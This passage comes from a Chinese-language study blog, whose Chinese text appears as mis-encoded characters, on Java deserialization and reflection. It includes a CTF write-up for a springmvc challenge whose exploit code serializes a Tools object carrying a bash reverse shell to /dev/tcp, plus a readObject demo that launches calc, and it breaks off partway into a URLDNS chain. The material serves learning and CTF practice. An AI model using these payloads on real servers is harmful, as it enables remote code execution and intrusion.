<p><code>readObject</code>æ–¹æ³•çš„å®‰å…¨é—®é¢˜ï¼šå½“ç±»è¢«ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå¦‚æœç±»é‡Œé¢æœ‰<code>readObejct</code>æ–¹æ³•å°±ä¼šè‡ªåŠ¨æ‰§è¡Œä»£ç ï¼ˆåªè¦æœåŠ¡ç«¯ååºåˆ—åŒ–æ•°æ®ï¼Œå®¢æˆ·ç«¯ä¼ é€’ç±»çš„readObjectä¸­ä»£ç ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œç»™äºˆæ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œä»£ç çš„èƒ½åŠ›</p>
<p><strong>Tips:</strong></p>
<blockquote>
<p>å…±åŒæ¡ä»¶ ç»§æ‰¿Serialize</p>
</blockquote>
<blockquote>
<p>å…¥å£ç±» sourceï¼ˆé‡å†™readObject=&gt;è°ƒç”¨å¸¸è§çš„å‡½æ•° å‚æ•°ç±»å‹å®½æ³› æœ€å¥½jdkè‡ªå¸¦ï¼‰ å¦‚ <code>Map</code>ã€<code>HashMap</code></p>
</blockquote>
<blockquote>
<p>è°ƒç”¨é“¾ gadget chain</p>
</blockquote>
<blockquote>
<p>æ‰§è¡Œç±» sink ï¼ˆrce ssrf å†™æ–‡ä»¶â€¦â€¦ï¼‰</p>
</blockquote>
<p><strong>æ¼æ´ç›¸å…³ï¼š</strong></p>
<p>å½“è¿›è¡Œssrfçš„æ—¶å€™ï¼Œjavaä¸­çš„<code>URL</code>ç±»ï¼ˆå¯åºåˆ—åŒ–ï¼‰</p>
<h5 id="3-æ·±å…¥å­¦ä¹ ä¹‹javaåå°„"><a href="#3-æ·±å…¥å­¦ä¹ ä¹‹javaåå°„" class="headerlink" title="3.æ·±å…¥å­¦ä¹ ä¹‹javaåå°„"></a>3.æ·±å…¥å­¦ä¹ ä¹‹javaåå°„</h5><p><strong>åå°„ï¼š</strong>ä¸€å¼€å§‹æˆ‘ä»¬å¹¶ä¸çŸ¥é“æˆ‘ä»¬è¦åˆå§‹åŒ–çš„ç±»å¯¹è±¡æ˜¯ä»€ä¹ˆï¼Œè‡ªç„¶ä¹Ÿæ— æ³•ä½¿ç”¨newå…³é”®å­—æ¥åˆ›å»ºå¯¹è±¡</p>
<p>ï¼ˆå¯åˆ©ç”¨javaåå°„è°ƒç”¨defaultä¿®é¥°çš„ç±»ã€è°ƒç”¨æ–¹æ³•</p>
<p><code>Student</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">char</span> sex;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    Student(int id,String name,char sex)&#123;</span></span><br><span class="line"><span class="comment">//        this.id = id;</span></span><br><span class="line"><span class="comment">//        this.name = name;</span></span><br><span class="line"><span class="comment">//        this.sex = sex;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">char</span> sex)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">getSex</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this is a student&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>RefectionTest</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RefectionTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        Class c = student.getClass();</span><br><span class="line">        <span class="comment">// åå°„å°±æ˜¯æ“ä½œClass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»åŸå‹classé‡Œå®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line"><span class="comment">//        c.newInstance();</span></span><br><span class="line">        <span class="comment">// å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥è·å–æ„é€ æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// ç„¶ågetConstructoræ–¹æ³•é‡Œé¢å¯ä»¥å†™å…¥å‚æ•° ç±»ä¼¼äºString.classç”¨æ¥åŒ¹é…æˆ‘ä»¬æƒ³è¦å®ä¾‹åŒ–</span></span><br><span class="line">        <span class="comment">// çš„ç±»çš„æœ‰å‚æ„é€ æ–¹æ³•çš„å‚æ•°</span></span><br><span class="line">        Constructor constructor = c.getConstructor();</span><br><span class="line">        <span class="comment">// è¿›è¡Œå®ä¾‹åŒ–</span></span><br><span class="line">        Student student1 = (Student) constructor.newInstance();</span><br><span class="line">        System.out.println(student1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–ç±»é‡Œé¢å±æ€§</span></span><br><span class="line"><span class="comment">//        c.getFields(); // è·å–æ‰€æœ‰å±æ€§</span></span><br><span class="line">        <span class="comment">// getFieldsè·å–publicçš„å±æ€§</span></span><br><span class="line">        <span class="comment">// getDeclaredFieldsè·å–æ‰€æœ‰å±æ€§</span></span><br><span class="line"><span class="comment">//        Field[] fields = c.getDeclaredFields();</span></span><br><span class="line"><span class="comment">//        for (Field f : fields)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(f);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// getFieldåªèƒ½è·å–publicçš„å±æ€§</span></span><br><span class="line">        <span class="comment">// ä¸èƒ½ä¿®æ”¹ç§æœ‰å±æ€§çš„å€¼ è®¿é—®</span></span><br><span class="line">        Field name = c.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®ç°å¯¹ç§æœ‰å±æ€§å˜é‡çš„è®¿é—®å’Œä¿®æ”¹</span></span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(student1,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        System.out.println(student1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è°ƒç”¨ç±»é‡Œé¢çš„æ–¹æ³•</span></span><br><span class="line"><span class="comment">//        Method[] method = c.getMethods();</span></span><br><span class="line"><span class="comment">//        for(Method m : method)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœæ–¹æ³•æ— å‚æ•°åˆ™å¦‚ä¸‹</span></span><br><span class="line">        Method action = c.getMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        action.invoke(student1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœæ–¹æ³•æœ‰å‚æ•° è¦è¯´æ˜è°ƒç”¨å‡½æ•°çš„å‚æ•°çš„æ•°æ®ç±»å‹</span></span><br><span class="line">        <span class="comment">// ç„¶åä¹Ÿè¦æ³¨æ„å¦‚æœæ–¹æ³•æ˜¯ç§æœ‰å±æ€§çš„æ–¹æ³• ä¸èƒ½éšæ„è®¿é—®</span></span><br><span class="line">        Method action1 = c.getMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">// å®ç°å¯¹ç§æœ‰å±æ€§çš„æ–¹æ³•çš„è®¿é—®</span></span><br><span class="line">        action.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        action1.invoke(student1,<span class="string">&quot;ameuu&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="V-amp-N2020å…¬å¼€èµ›-springmvc"><a href="#V-amp-N2020å…¬å¼€èµ›-springmvc" class="headerlink" title="[V&amp;N2020å…¬å¼€èµ›]springmvc"></a>[V&amp;N2020å…¬å¼€èµ›]springmvc</h5><p><a href="buuoj.cn">buuoj.cn</a></p>
<p><u>1.å…ˆè‡ªå·±åš</u></p>
<p>å› ä¸ºè¿˜æ²¡å­¦è¿‡Springæ¡†æ¶ï¼Œä¹Ÿä¸ä¼šæ­ï¼Œå°±å…ˆè‡ªå·±éšä¾¿çœ‹çœ‹ä»£ç äº†</p>
<p>å¯ä»¥å‘ç°<code>Tools</code>ç±»æ˜¯å­˜åœ¨<code>Serialize</code>æ¥å£çš„ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ï¼Œå¹¶ä¸”å†™äº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å‡½æ•°ï¼Œæœ€åè¿˜é‡å†™äº†<code>readObject</code>ï¼Œæ‰€ä»¥è¯¥ç±»åº”è¯¥å°±æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ç±»</p>
<p>é‚£æˆ‘ä»¬å¯ä»¥å…ˆæ¥çœ‹çœ‹readObjectæ–¹æ³•ï¼Œå‘ç°å¯è¦ä¼ å…¥çš„æ˜¯ååºåˆ—åŒ–ä¹‹åçš„å†…å®¹ï¼Œå…¶å®åº”è¯¥ä¹Ÿç®—æ˜¯ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åè¿›è¡Œå®ä¾‹åŒ–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">       Object obj = in.readObject();</span><br><span class="line">       (<span class="keyword">new</span> ProcessBuilder((String[])((String[])obj))).start();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥æ‰¾æ‰¾çœ‹<code>ProcessBuilder</code>ç±»</p>
<p><img src="https://img-blog.csdnimg.cn/a97256bde2c440d9a1f9804720df1b5b.png" alt="img"></p>
<p>å†çœ‹çœ‹å…¶ä»–çš„ç±»</p>
<p>å¯ä»¥æ‰¾åˆ°æ¯”è¾ƒç‰¹åˆ«çš„ç±»ï¼Œ<code>ClientInfoFilter</code>ï¼Œå› ä¸ºè¿™é‡Œè°ƒç”¨äº†Toolsä¸­çš„åºåˆ—åŒ–å‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.filters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tools.ClientInfo;</span><br><span class="line"><span class="keyword">import</span> com.tools.Tools;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64.Decoder;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64.Encoder;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClentInfoFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClentInfoFilter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig fcg)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        Cookie[] cookies = ((HttpServletRequest)request).getCookies(); <span class="comment">//è·å–Cookie</span></span><br><span class="line">        <span class="keyword">boolean</span> exist = <span class="keyword">false</span>;</span><br><span class="line">        Cookie cookie = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (cookies != <span class="keyword">null</span>) &#123; <span class="comment">// å¦‚æœCookieä¸ä¸ºç©º</span></span><br><span class="line">            Cookie[] var7 = cookies;</span><br><span class="line">            <span class="keyword">int</span> var8 = cookies.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var9 = <span class="number">0</span>; var9 &lt; var8; ++var9) &#123;</span><br><span class="line">                Cookie c = var7[var9];</span><br><span class="line">                <span class="keyword">if</span> (c.getName().equals(<span class="string">&quot;cinfo&quot;</span>)) &#123;</span><br><span class="line">                    exist = <span class="keyword">true</span>;</span><br><span class="line">                    cookie = c;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes;</span><br><span class="line">        <span class="keyword">if</span> (exist) &#123; <span class="comment">// å¦‚æœCookieä¸­çš„åå­—ä¸ºcinfoä¸ºtrue</span></span><br><span class="line">            String b64 = cookie.getValue(); <span class="comment">// è·å–å†…å®¹</span></span><br><span class="line">            Decoder decoder = Base64.getDecoder(); <span class="comment">// baseè§£ç </span></span><br><span class="line">            bytes = decoder.decode(b64); <span class="comment">// è½¬æˆå­—èŠ‚</span></span><br><span class="line">            ClientInfo cinfo = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (!b64.equals(<span class="string">&quot;&quot;</span>) &amp;&amp; bytes != <span class="keyword">null</span>) &#123; <span class="comment">// å¦‚æœéƒ½ä¸ä¸ºç©º</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    cinfo = (ClientInfo)Tools.parse(bytes); <span class="comment">// è¿›è¡Œååºåˆ—åŒ– å¹¶å®ä¾‹åŒ–æˆClientInfoçš„å¯¹è±¡</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var14) &#123;</span><br><span class="line">                    var14.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cinfo = <span class="keyword">new</span> ClientInfo(<span class="string">&quot;Anonymous&quot;</span>, <span class="string">&quot;normal&quot;</span>, ((HttpServletRequest)request).getRequestedSessionId()); <span class="comment">// å¦‚æœå†…å®¹ä¸ºç©º åˆ™è¿›è¡Œå®ä¾‹åŒ–</span></span><br><span class="line">                Encoder encoder = Base64.getEncoder();<span class="comment">// baseåŠ å¯†</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    bytes = Tools.create(cinfo); <span class="comment">// è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var15) &#123;</span><br><span class="line">                    var15.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                cookie.setValue(encoder.encodeToString(bytes)); <span class="comment">// è®¾ç½®cookie</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ((HttpServletRequest)request).getSession().setAttribute(<span class="string">&quot;cinfo&quot;</span>, cinfo); </span><br><span class="line">            <span class="comment">// è·å–sessionå¹¶å¢åŠ å±æ€§ä¸ºcinfo å°†å€¼ä¼ è¿›å»</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Encoder encoder = Base64.getEncoder(); <span class="comment">// å¦‚æœcookieä¸å­˜åœ¨ å°†encoderå®ä¾‹åŒ–æˆbase64çš„åŠ å¯†</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ClientInfo cinfo = <span class="keyword">new</span> ClientInfo(<span class="string">&quot;Anonymous&quot;</span>, <span class="string">&quot;normal&quot;</span>, ((HttpServletRequest)request).getRequestedSessionId()); </span><br><span class="line">                bytes = Tools.create(cinfo);</span><br><span class="line">                cookie = <span class="keyword">new</span> Cookie(<span class="string">&quot;cinfo&quot;</span>, encoder.encodeToString(bytes));</span><br><span class="line">                cookie.setMaxAge(<span class="number">86400</span>);</span><br><span class="line">                ((HttpServletResponse)response).addCookie(cookie);</span><br><span class="line">                ((HttpServletRequest)request).getSession().setAttribute(<span class="string">&quot;cinfo&quot;</span>, cinfo);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var13) &#123;</span><br><span class="line">                var13.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡ä¸‹æ¥ï¼Œå¯ä»¥å‘ç°å¦‚æœæˆ‘ä»¬è¦åˆ©ç”¨è¿™ä¸ªç±»çš„è¯ï¼Œé‚£åº”è¯¥æ˜¯è¦æ»¡è¶³ç¬¬ä¸€ä¸ªifè¯­å¥ï¼Œç„¶åè°ƒç”¨ååºåˆ—åŒ–å‡½æ•°ï¼Œå¹¶ä¸”è¦ååºåˆ—åŒ–Toolç±»ï¼Œä»è€Œæ‰§è¡ŒToolç±»é‡Œé¢çš„readObjectæ–¹æ³•ï¼Œç„¶åè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œè™½ç„¶å¤§æ¦‚æ€è·¯æ˜¯çŸ¥é“çš„ï¼Œä½†æ˜¯æ— ä»ä¸‹æ‰‹ï¼ˆèœ</p>
<p>çœ‹çœ‹åˆ«çš„å¸ˆå‚…çš„wpå§ï¼ï¼</p>
<p><u>2.å­¦ä¹ ï¼</u></p>
<p>å‘ç°æˆ‘çš„æ€è·¯ä¹Ÿå¯¹ï¼Œæ€»çš„æ¥è¯´å°±æ˜¯è¦æŠŠæˆ‘ä»¬ä¼ªé€ çš„åºåˆ—åŒ–å­—ç¬¦ä¸²æ”¾å…¥cookieä¸­ï¼Œç„¶åååºåˆ—åŒ–è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œé‚£ä¹ˆç°åœ¨æ¯”è¾ƒéš¾ç†è§£çš„å°±æ˜¯è¯¥æ€ä¹ˆè¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†</p>
<blockquote>
<p>ç†è§£ï¼šToolsç±»ä¸­è¿˜å­˜åœ¨ä¸€ä¸ªå±æ€§testCallæ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ï¼Œè€Œåœ¨æœ€åå‘½ä»¤æ‰§è¡Œçš„æ—¶å€™ä¼šä»¥String[]æ¥æ”¶æ•°æ®ï¼Œé‚£åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°†testCallæ”¹æˆString[]ç„¶åå°†å‘½ä»¤ä¼ è¿›å»ï¼Œé‚£ååºåˆ—åŒ–è°ƒç”¨çš„æ—¶å€™å°±ä¼šæ‰§è¡Œæˆ‘ä»¬å†™å…¥çš„è¯­å¥</p>
</blockquote>
<p>exp:</p>
<p><code>Tools</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;<span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tools</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String[] testCall;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tools</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTestCall</span><span class="params">(String[] str)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.testCall = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(bytes));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] create(Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        outputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Object obj = in.readObject();</span><br><span class="line">        (<span class="keyword">new</span> ProcessBuilder((String[])((String[])obj))).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>ToolsTest</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ToolsTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Tools tools = <span class="keyword">new</span> Tools();</span><br><span class="line">        String[] cmd = &#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp;  /dev/tcp/ip/6868 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">        tools.setTestCall(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Tools.create(tools);</span><br><span class="line">        Base64.Encoder encoder = Base64.getEncoder();</span><br><span class="line">        System.out.println(encoder.encodeToString(bytes));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>URL DNSé“¾</strong></p>
<p>é¦–å…ˆå¯åˆ©ç”¨çš„ç±»ä¸º<code>HashMap</code>ï¼Œå› ä¸ºè¿™ä¸ªç±»é‡Œé¢é‡å†™äº†<code>readObject</code>ç­‰ï¼Œç„¶åæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è°ƒç”¨<code>HashMap</code>é‡Œé¢çš„<code>hashCode</code>æ–¹æ³•ä»è€Œäº§ç”ŸDNSè¯·æ±‚ã€‚</p>
<p>è€Œåœ¨putçš„æ—¶å€™å°±ä¼šåœ¨hashå‡½æ•°é‡Œé¢è°ƒç”¨<code>key.hashCode()</code>æ–¹æ³•ï¼Œä½†æ˜¯åœ¨æµ‹è¯•çš„æ—¶å€™ä¼šå‘ç°ï¼Œå°±ç®—æ²¡æœ‰ååºåˆ—åŒ–ä¹Ÿä¼šå‘èµ·è¯·æ±‚ï¼Œè¿™ä¼šå¯¹æˆ‘ä»¬æ˜¯å¦æˆåŠŸè€Œäº§ç”Ÿè¿·æƒ‘æ€§ï¼Œæ‰€æœ‰æˆ‘ä»¬è¦ä½¿å¾—åºåˆ—åŒ–çš„æ—¶å€™ä¸èƒ½å‘èµ·è¯·æ±‚ï¼Œæ‰€æœ‰è¦åœ¨ä¸€å¼€å§‹hashCodeçš„å€¼ä¸èƒ½ä¸º-1ï¼Œä½†æ˜¯åˆè¦åœ¨ååºåˆ—åŒ–ä¹‹å‰æŠŠhashCodeçš„å€¼æ”¹ä¸º-1</p>
<p><code>SerializeTest</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span 